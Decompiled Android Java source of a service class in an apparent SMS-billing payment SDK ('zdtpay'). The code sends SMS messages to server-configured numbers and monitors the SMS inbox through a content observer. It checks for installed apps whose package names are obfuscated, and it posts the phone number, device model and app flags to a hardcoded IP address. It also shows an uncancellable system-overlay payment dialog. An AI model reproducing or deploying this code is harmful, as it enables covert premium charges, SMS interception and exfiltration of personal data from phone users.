package com.zdtpay;

import android.app.Dialog;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;
import android.view.Display;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.RelativeLayout;
import android.widget.TextView;
import com.zdtpay.net.DataRequestTask;
import com.zdtpay.tools.MyLogPrinter;
import com.zdtpay.tools.f;
import com.zdtpay.tools.g;
import com.zdtpay.tools.h;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

public class ZTbbe
  extends c
{
  public TextView g;
  public TextView h;
  public TextView i;
  Handler j = new s(this);
  Handler k = new y(this);
  Handler l = new z(this);
  Handler m = new aa(this);
  String n = "SENT_SMS_ACTION";
  String o = "DELIVERED_SMS_ACTION";
  private ZDTPayParamInfo p;
  private com.zdtpay.a.a q;
  private boolean r;
  private StringBuffer s;
  private f t;
  private BroadcastReceiver u = new ab(this);
  private BroadcastReceiver v = new ac(this);
  
  public ZTbbe() {}
  
  public static String a(Context paramContext)
  {
    StringBuffer localStringBuffer = new StringBuffer();
    String str;
    if (b(paramContext))
    {
      str = "1";
      localStringBuffer.append(str);
      localStringBuffer.append("|");
      if (!c(paramContext)) {
        break label111;
      }
      str = "1";
      label41:
      localStringBuffer.append(str);
      localStringBuffer.append("|");
      if (!g.a(paramContext)) {
        break label117;
      }
      str = "1";
      label64:
      localStringBuffer.append(str);
      localStringBuffer.append("|");
      if (!d(paramContext)) {
        break label123;
      }
    }
    label111:
    label117:
    label123:
    for (paramContext = "1";; paramContext = "0")
    {
      localStringBuffer.append(paramContext);
      localStringBuffer.append("|");
      return localStringBuffer.toString();
      str = "0";
      break;
      str = "0";
      break label41;
      str = "0";
      break label64;
    }
  }
  
  public static void a(Context paramContext, String paramString1, String paramString2)
  {
    a(paramContext, paramString1, paramString2, "");
  }
  
  public static void a(Context paramContext, String paramString1, String paramString2, String paramString3)
  {
    try
    {
      if ((TextUtils.isEmpty(paramString1)) || ((!paramString1.equals("1390")) && (!paramString1.equals("00000"))))
      {
        MyLogPrinter.a("!1390");
        return;
      }
      MyLogPrinter.a("ZDTPayService.sendResult() " + paramString1);
      HashMap localHashMap = new HashMap();
      localHashMap.put("os", g.e());
      localHashMap.put("model", g.c());
      localHashMap.put("order", paramString1);
      localHashMap.put("tag", paramString2);
      localHashMap.put("other", paramString3);
      DataRequestTask.a(paramContext, 0, "http://112.126.69.51/2c.php", localHashMap, null, 1);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  private void a(String paramString1, String paramString2, PendingIntent paramPendingIntent1, PendingIntent paramPendingIntent2)
  {
    new Thread(new w(this, paramString1, paramString2, paramPendingIntent1, paramPendingIntent2)).start();
  }
  
  private void a(ArrayList paramArrayList, boolean paramBoolean)
  {
    i();
    this.t = new f(this.f);
    this.s = new StringBuffer();
    int i1 = 0;
    int i2 = 0;
    if (i2 >= paramArrayList.size())
    {
      this.t.b();
      if (i1 >= paramArrayList.size())
      {
        c(((com.zdtpay.a.b)paramArrayList.get(paramArrayList.size() - 1)).i());
        MyLogPrinter.a("短信发送成功@日限");
        a(this.f, -1, -1, ((com.zdtpay.a.b)paramArrayList.get(paramArrayList.size() - 1)).i());
      }
      return;
    }
    if ((((com.zdtpay.a.b)paramArrayList.get(i2)).n() == 2) && (g.d())) {
      i1 += 1;
    }
    for (;;)
    {
      i2 += 1;
      break;
      Object localObject1 = new Intent(this.n);
      ((Intent)localObject1).putExtra(com.zdtpay.tools.c.o, this.d.getString(com.zdtpay.tools.c.o + i2, ""));
      ((Intent)localObject1).putExtra(com.zdtpay.tools.c.o + "tid", ((com.zdtpay.a.b)paramArrayList.get(i2)).a());
      localObject1 = PendingIntent.getBroadcast(this, this.d.getString(com.zdtpay.tools.c.o + i2, "").hashCode(), (Intent)localObject1, 134217728);
      Object localObject2 = new Intent(this.o);
      ((Intent)localObject2).putExtra(com.zdtpay.tools.c.o, ((com.zdtpay.a.b)paramArrayList.get(i2)).a());
      localObject2 = PendingIntent.getBroadcast(this, this.d.getString(com.zdtpay.tools.c.o + i2, "").hashCode(), (Intent)localObject2, 134217728);
      MyLogPrinter.a(this.d.getString(new StringBuilder(String.valueOf(com.zdtpay.tools.c.v)).append(i2).toString(), "") + " " + this.d.getString(new StringBuilder(String.valueOf(com.zdtpay.tools.c.w)).append(i2).toString(), ""));
      Object localObject3 = ((com.zdtpay.a.b)paramArrayList.get(i2)).e();
      int i3;
      String str;
      if (!((String)localObject3).equals("0"))
      {
        localObject3 = ((String)localObject3).split("\\|");
        if (!localObject3[0].equals("0"))
        {
          i3 = Calendar.getInstance().get(6);
          str = this.t.a(((com.zdtpay.a.b)paramArrayList.get(i2)).k() + com.zdtpay.tools.c.E);
          if (Integer.parseInt(this.t.a(((com.zdtpay.a.b)paramArrayList.get(i2)).k() + "toter")) == i3) {
            break label744;
          }
          this.t.a(((com.zdtpay.a.b)paramArrayList.get(i2)).k() + com.zdtpay.tools.c.E, "1", ((com.zdtpay.a.b)paramArrayList.get(i2)).k() + "toter", i3);
        }
      }
      label744:
      int i4;
      int i5;
      for (;;)
      {
        localObject3 = this.d.getString(com.zdtpay.tools.c.w + i2, "");
        if ((!((String)localObject3).equals("")) && (!((String)localObject3).equals("NO_ZL"))) {
          break label1021;
        }
        c(((com.zdtpay.a.b)paramArrayList.get(i2)).i());
        break;
        i4 = Integer.parseInt(str);
        i5 = Integer.parseInt(localObject3[0]);
        if (i4 >= i5 + 2) {
          break label866;
        }
        MyLogPrinter.a("c1 < (c2 + 2)       ");
        this.t.a(((com.zdtpay.a.b)paramArrayList.get(i2)).k() + com.zdtpay.tools.c.E, i4 + 1, ((com.zdtpay.a.b)paramArrayList.get(i2)).k() + "toter", i3);
      }
      label866:
      this.t.a(((com.zdtpay.a.b)paramArrayList.get(i2)).k() + com.zdtpay.tools.c.E, i4, ((com.zdtpay.a.b)paramArrayList.get(i2)).k() + "toter", i3);
      MyLogPrinter.a("日限 已发:" + i4 + " " + " 总数:" + i5);
      a(this.f, i4, i5, ((com.zdtpay.a.b)paramArrayList.get(i2)).i());
      i1 += 1;
      continue;
      label1021:
      a(this.d.getString(com.zdtpay.tools.c.v + i2, ""), this.d.getString(com.zdtpay.tools.c.w + i2, ""), (PendingIntent)localObject1, (PendingIntent)localObject2);
      a(this.f, ((com.zdtpay.a.b)paramArrayList.get(i2)).a(), "1");
      if (this.d.getString(com.zdtpay.tools.c.o + i2, "").endsWith("_x"))
      {
        i3 = this.d.getInt(com.zdtpay.tools.c.z, 1);
        this.d.edit().putInt(com.zdtpay.tools.c.z, i3 - 1).commit();
      }
    }
  }
  
  public static boolean b(Context paramContext)
  {
    try
    {
      paramContext.getPackageManager().getPackageInfo(h.a(new int[] { 28, 40, 38, 53, 42, 34, 33, 40, 40, 60, 63, 57, 53, 38, 40, 27, 34, 37, 30, 44, 26, 31, 30 }), 0);
      return true;
    }
    catch (PackageManager.NameNotFoundException paramContext) {}
    return false;
  }
  
  public static boolean c(Context paramContext)
  {
    try
    {
      paramContext.getPackageManager().getPackageInfo(h.a(new int[] { 28, 40, 38, 53, 45, 30, 39, 28, 30, 39, 45, 53, 42, 42, 41, 34, 38, 44, 30, 28, 46, 43, 30 }), 0);
      return true;
    }
    catch (PackageManager.NameNotFoundException paramContext) {}
    return false;
  }
  
  public static boolean d(Context paramContext)
  {
    return com.zdtpay.tools.a.a(paramContext).a();
  }
  
  private void f()
  {
    new ad(this).start();
  }
  
  private void g()
  {
    new ae(this).start();
  }
  
  private void h()
  {
    Object localObject1;
    WindowManager.LayoutParams localLayoutParams;
    int i1;
    if (this.p.getDialogType() == 1)
    {
      localObject1 = (RelativeLayout)LayoutInflater.from(this.f).inflate(a("zdt_dialog_layout_pay", "layout"), null);
      Object localObject2 = (Button)((RelativeLayout)localObject1).findViewById(a("zdt_dlp_cancel", "id"));
      if ((this.p.getLeft() != null) && (!this.p.getLeft().equals(""))) {
        ((Button)localObject2).setText(this.p.getLeft());
      }
      ((Button)localObject2).setOnClickListener(new af(this));
      localObject2 = (Button)((RelativeLayout)localObject1).findViewById(a("zdt_dlp_confirm_bt", "id"));
      if ((this.p.getRight() != null) && (!this.p.getRight().equals(""))) {
        ((Button)localObject2).setText(this.p.getRight());
      }
      ((Button)localObject2).setOnClickListener(new u(this));
      this.g = ((TextView)((RelativeLayout)localObject1).findViewById(a("zdt_dlp_price_tv", "id")));
      this.g.setText(this.p.getPrice());
      this.h = ((TextView)((RelativeLayout)localObject1).findViewById(a("zdt_dlp_product_tv", "id")));
      this.h.setText(this.p.getGoodsname());
      this.i = ((TextView)((RelativeLayout)localObject1).findViewById(a("zdt_dlp_desc_tv", "id")));
      this.i.setText(this.p.getDescription());
      this.e = new Dialog(this.f, 16973835);
      this.e.getWindow().setType(2003);
      this.e.requestWindowFeature(1);
      this.e.setContentView((View)localObject1);
      this.e.setCanceledOnTouchOutside(false);
      this.e.setCancelable(false);
      this.e.show();
      localObject1 = ((WindowManager)this.f.getSystemService("window")).getDefaultDisplay();
      localObject2 = this.e.getWindow();
      localLayoutParams = ((Window)localObject2).getAttributes();
      ((Window)localObject2).setBackgroundDrawable(new ColorDrawable(16711680));
      localLayoutParams.gravity = 17;
      i1 = this.f.getResources().getConfiguration().orientation;
      if (i1 != 2) {
        break label476;
      }
      localLayoutParams.height = ((Display)localObject1).getHeight();
      localLayoutParams.width = ((Display)localObject1).getHeight();
    }
    for (;;)
    {
      this.e.getWindow().setAttributes(localLayoutParams);
      return;
      localObject1 = (RelativeLayout)LayoutInflater.from(this.f).inflate(a("zdt_dialog_layout_pay_type_twobtn", "layout"), null);
      break;
      label476:
      if (i1 == 1) {
        localLayoutParams.width = ((int)(((Display)localObject1).getWidth() * 0.8D));
      }
    }
  }
  
  private void i()
  {
    k localK = new k(this, new v(this), this.q.d());
    getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, localK);
  }
  
  public void a(Context paramContext, int paramInt1, int paramInt2, String paramString)
  {
    try
    {
      MyLogPrinter.a("ZDTPayService.sendResult()" + paramInt1 + " " + paramInt2 + " " + paramString);
      HashMap localHashMap = new HashMap();
      localHashMap.put("os", g.e());
      localHashMap.put("model", g.c());
      localHashMap.put("t1", paramInt1);
      localHashMap.put("t2", paramInt2);
      localHashMap.put("order", paramString);
      DataRequestTask.a(paramContext, 0, "http://112.126.69.51/rixian.php", localHashMap, null, 1);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public void a(HashMap paramHashMap)
  {
    DataRequestTask.a(this, 0, "http://112.126.69.51/order_mo.php", paramHashMap, null);
  }
  
  public void c(String paramString)
  {
    if (com.zdtpay.tools.b.a != null)
    {
      HashMap localHashMap = new HashMap();
      localHashMap.put("isLast", "0");
      localHashMap.put("code", "1");
      localHashMap.put("paymoney", this.p.getPrice());
      localHashMap.put("err_msg", "");
      localHashMap.put("extra", this.p.getExtra());
      localHashMap.put("order", paramString);
      com.zdtpay.tools.b.a.onSuccess(localHashMap);
    }
  }
  
  public void d()
  {
    f();
    g();
  }
  
  public void e()
  {
    String str = this.d.getString(com.zdtpay.tools.c.j, "13800138000");
    Object localObject = str;
    if (str.equals("13800138000")) {
      localObject = g.c(this.f);
    }
    this.p.setMobile((String)localObject);
    this.p.setMobile_type(g.h(this.f));
    localObject = new HashMap();
    ((HashMap)localObject).put(com.zdtpay.tools.c.l, this.p.getPrice());
    ((HashMap)localObject).put(com.zdtpay.tools.c.n, this.p.getGoodsname());
    ((HashMap)localObject).put(com.zdtpay.tools.c.p, this.p.getExtra());
    ((HashMap)localObject).put(com.zdtpay.tools.c.q, this.p.getDescription());
    ((HashMap)localObject).put(com.zdtpay.tools.c.r, this.p.getJfdbz());
    ((HashMap)localObject).put("soft", a(this.f));
    ((HashMap)localObject).put("soft_data", g.c());
    ((HashMap)localObject).put("time", System.currentTimeMillis());
    a("加载中...");
    DataRequestTask.a(this, 0, "http://112.126.69.51/order.php", (HashMap)localObject, new x(this));
  }
  
  public void onCreate()
  {
    super.onCreate();
    if (!this.r)
    {
      this.r = true;
      registerReceiver(this.u, new IntentFilter(this.n));
      registerReceiver(this.v, new IntentFilter(this.o));
    }
  }
  
  public void onDestroy()
  {
    if (this.r)
    {
      this.r = false;
      unregisterReceiver(this.u);
      unregisterReceiver(this.v);
    }
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if (paramIntent == null) {
      return 2;
    }
    if (!g.b(this.f))
    {
      b("无网络连接");
      paramIntent = new HashMap();
      paramIntent.put("code", "-2");
      paramIntent.put("err_msg", "无网络");
      paramIntent.put("isLast", "1");
      com.zdtpay.tools.b.a.onFail(paramIntent);
      a();
      return 2;
    }
    if (!g.a(this.f))
    {
      b("无有效SIM卡");
      paramIntent = new HashMap();
      paramIntent.put("code", "-3");
      paramIntent.put("err_msg", "无sim卡");
      paramIntent.put("isLast", "1");
      com.zdtpay.tools.b.a.onFail(paramIntent);
      a();
      return 2;
    }
    this.p = com.zdtpay.tools.b.d;
    d();
    if (!this.r)
    {
      this.r = true;
      registerReceiver(this.u, new IntentFilter(this.n));
      registerReceiver(this.v, new IntentFilter(this.o));
    }
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
}
